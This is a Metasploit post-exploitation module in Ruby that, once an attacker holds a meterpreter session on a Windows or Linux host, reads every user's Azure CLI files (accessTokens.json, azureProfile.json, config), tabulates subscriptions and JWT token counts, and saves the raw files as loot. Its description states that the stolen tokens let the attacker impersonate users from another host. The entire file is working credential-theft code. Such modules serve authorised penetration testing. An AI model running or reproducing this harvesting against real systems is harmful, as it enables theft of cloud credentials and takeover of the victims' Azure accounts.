##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Multi Gather Azure CLI credentials',
      'Description'   => %q(
        This module will collect the Azure CLI 2.0 (az cli) settings files
        for all users on a given target. These configuration files contain
        JWT tokens used to authenticate users and other subscription information.
        Once tokens are stolen from one host, they can be used to impersonate
        the user from a different host.
      ),
      'License'       => MSF_LICENSE,
      'Author'        => ['James Otten <jamesotten1[at]gmail.com>'],
      'Platform'      => ['win', 'linux'],
      'SessionTypes'  => ['meterpreter']
    ))
  end

  def process_profile_file(file_path, file_data)
    table_data = []
    data = parse_json(file_path, file_data)
    if data && data.key?("subscriptions")
      data["subscriptions"].each do |item|
        table_data << [file_path, item["name"], item["user"]["name"], item["environmentName"]]
      end
    end
    table_data
  end

  def process_tokens_file(file_path, file_data)
    table_data = []
    data = parse_json(file_path, file_data)
    if data
      dic = {}
      data.each do |item|
        if dic.key?(item["userId"])
          dic[item["userId"]] = dic[item["userId"]] + 1
        else
          dic[item["userId"]] = 1
        end
      end
      dic.each do |key, value|
        table_data << [file_path, key, value]
      end
    end
    table_data
  end

  def parse_json(file_path, str)
    data = nil
    options = { :invalid => :replace, :undef => :replace, :replace => '' }
    str = str.encode(Encoding.find('ASCII'), options)
    begin
      data = JSON.parse(str)
    rescue ::JSON::ParserError
      print_error("Unable to parse #{file_path}")
    end
    data
  end

  def user_dirs
    user_dirs = []
    if session.platform == 'windows'
      grab_user_profiles.each do |profile|
        user_dirs.push(profile['ProfileDir'])
      end
    elsif session.platform == 'linux'
      user_dirs = enum_user_directories
    else
      fail_with(Failure::BadConfig, "Unsupported platform")
    end
    user_dirs
  end

  def run
    subscription_table = Rex::Text::Table.new(
      "Header" => "Subscriptions",
      "Columns" => ["Source", "Account Name", "Username", "Cloud Name"]
    )
    tokens_table = Rex::Text::Table.new(
      "Header" => "Tokens",
      "Columns" => ["Source", "Username", "Count"]
    )
    loot_type = nil
    description = nil
    user_dirs.map do |user_directory|
      vprint_status("Looking for az cli data in #{user_directory}")
      %w[.azure/accessTokens.json .azure/azureProfile.json .azure/config].each do |file_location|
        possible_location = ::File.join(user_directory, file_location)
        if exists?(possible_location)
          data = read_file(possible_location)
          if data
            vprint_status("Found az cli file #{possible_location}")
            if file_location.end_with?("accessTokens.json")
              loot_type = "azurecli.jwt_tokens"
              description = "Azure CLI access/refresh JWT tokens"
              process_tokens_file(possible_location, data).each do |item|
                tokens_table << item
              end
            elsif file_location.end_with?("config")
              loot_type = "azurecli.config"
              description = "Azure CLI configuration"
            elsif file_location.end_with?("azureProfile.json")
              loot_type = "azurecli.azure_profile"
              description = "Azure CLI profile"
              process_profile_file(possible_location, data).each do |item|
                subscription_table << item
              end
            end
            stored = store_loot(loot_type, "text/plain", session, data, file_location, description)
            print_good("#{possible_location} stored to #{stored}")
          end
        end
      end
    end

    print_line(subscription_table.to_s)
    print_line(tokens_table.to_s)
  end
end
